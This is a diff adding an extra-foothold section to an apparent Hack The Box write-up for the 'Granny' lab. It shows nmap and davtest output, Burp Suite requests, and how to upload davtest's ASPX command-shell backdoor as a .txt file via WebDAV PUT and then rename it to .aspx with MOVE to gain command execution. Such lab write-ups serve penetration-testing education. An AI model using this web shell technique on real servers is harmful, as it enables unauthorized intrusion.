@@ -465,3 +465,176 @@ After that they use the local exploit suggester to find possible exploits to use
 Update IIS. The main issue is a buffer overflow in the 'ScStoragePathFromUrl' function. An awesome explanation of patching this can be found here: https://blog.0patch.com/2017/03/0patching-immortal-cve-2017-7269.html 
 
 The token impersonation exploit can be fixed by either updating to a newer system, or not allowing users to execute binaries.
+
+
+# Extra Foothold solution!
+
+```
+kali@kali:/htb/Granny$ sudo nmap -sV -sC 10.129.86.102
+[sudo] password for kali: 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-23 15:34 EST
+Nmap scan report for 10.129.86.102
+Host is up (0.028s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-methods: 
+|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: Under Construction
+| http-webdav-scan: 
+|   Server Date: Sat, 23 Jan 2021 20:34:48 GMT
+|   Server Type: Microsoft-IIS/6.0
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|   WebDAV type: Unknown
+|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+
+```
+
+We can see public methods for webDAV: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, and SEARCH
+
+
+So we can upload some files to the server with PUT. Maybe a reverse shell, or maybe a command input to send to the shell. 
+
+So to figure out how this works. I’m going to use a tool called DavTest. To test the possibilities of WebDAV. And then use BurpSuite to record what davtest does, so I understand how the mechanics of WebDAV works. Hopefully this will show me how to upload files to the server. 
+
+So I open burp as sudo with `sudo burpsuite` and put in these options to record the traffic and redirect it:
+
+
+![](images/1.png)
+
+![](images/2.png)
+
+![](images/3.png)
+
+
+```
+kali@kali::/htb/Granny$ davtest -url http://localhost/
+********************************************************
+ Testing DAV connection
+OPEN            SUCCEED:                http://localhost
+********************************************************
+NOTE    Random string for this session: ctcFSp
+********************************************************
+ Creating directory
+MKCOL           SUCCEED:                Created http://localhost/DavTestDir_ctcFSp
+********************************************************
+ Sending test files
+PUT     txt     SUCCEED:        http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.txt
+PUT     cfm     SUCCEED:        http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.cfm
+PUT     asp     FAIL
+PUT     cgi     FAIL
+PUT     pl      SUCCEED:        http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.pl
+PUT     shtml   FAIL
+PUT     jhtml   SUCCEED:        http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.jhtml
+PUT     html    SUCCEED:        http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.html
+PUT     jsp     SUCCEED:        http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.jsp
+PUT     aspx    FAIL
+PUT     php     SUCCEED:        http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.php
+********************************************************
+ Checking for test file execution
+EXEC    txt     SUCCEED:        http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.txt
+EXEC    cfm     FAIL
+EXEC    pl      FAIL
+EXEC    jhtml   FAIL
+EXEC    html    SUCCEED:        http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.html
+EXEC    jsp     FAIL
+EXEC    php     FAIL
+
+********************************************************
+/usr/bin/davtest Summary:
+Created: http://localhost/DavTestDir_ctcFSp
+PUT File: http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.txt
+PUT File: http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.cfm
+PUT File: http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.pl
+PUT File: http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.jhtml
+PUT File: http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.html
+PUT File: http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.jsp
+PUT File: http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.php
+Executes: http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.txt
+Executes: http://localhost/DavTestDir_ctcFSp/davtest_ctcFSp.html
+```
+So the put command is successful on a lot of different formats. But execution only works on txt and html. Hmm, so we can’t put an .aspx file and run code from there…
+
+Unless…
+
+We also have access to the MOVE command. And when you move something, you get to choose its name and destination. So what if we PUT a txt file, and then MOVE it from file.txt to file.aspx. Lets try:
+
+![](images/4.png)
+
+Here we have all the traffic sent by davtest.
+
+Let's click on the PUT txt request. And press ctrl+r to send it to the repeater:
+
+![](images/5.png)
+
+Davtest actually has some cool stuff built in for us. We could also use msfvenom to generate a reverse shell.
+
+`/usr/share/davtest/backdoors/aspx_cmd.aspx`
+
+So we can just copy that and paste it in the text file:
+
+```
+kali@kali:/htb/Granny$ cat /usr/share/davtest/backdoors/aspx_cmd.aspx | xclip -sel clip
+```
+
+Here I’m just using xclip to send the cat into my clipboard, and then I simply paste into burpsuite and change the name to cmd_shell.txt:
+
+![](images/6.png)
+
+We get a 201, which means successful.
+
+So now we need to move it into an aspx file.
+
+I run davtest with the -move flag to see how that works:
+
+```
+kali@kali:/opt/CrackMapExec$ davtest -url http://localhost/ -move
+********************************************************
+ Testing DAV connection
+OPEN            SUCCEED:                http://localhost
+********************************************************
+NOTE    Random string for this session: oakz4lEDY
+********************************************************
+ Creating directory
+MKCOL           SUCCEED:                Created http://localhost/DavTestDir_oakz4lEDY
+********************************************************
+ Sending test files (MOVE method)
+
+BLAH BLAH BLAH
+********************************************************
+ Checking for test file execution
+BLAH BLAH BLAH
+
+
+********************************************************
+/usr/bin/davtest Summary:
+BLAH BLAH BLAH
+
+Executes: http://localhost/DavTestDir_oakz4lEDY/davtest_oakz4lEDY.txt
+```
+
+And I see in burpsuite that this looks like:
+
+```
+MOVE /DavTestDir_P6CVJwQ/davtest_P6CVJwQ_shtml.txt HTTP/1.1
+TE: deflate,gzip;q=0.3
+Connection: close
+Host: localhost:80
+User-Agent: DAV.pm/v0.49
+Content-Length: 0
+Depth: infinity
+Destination: http://localhost/DavTestDir_P6CVJwQ/davtest_P6CVJwQ.shtml
+Overwrite: T
+```
+
+So let's try to input our cmd_shell.txt and aspx there instead:
+
+![](images/7.png)
+
+Another 201, great news.
+
+![](images/8.png)
+
+And we have a shell execute. This is not really a fully interactive shell. Since it will always execute in this directory. But it’s a fun variation of the reverse shell with the nc listener. And maybe the nc listener won't work for some reason, but this will. You never know.
+
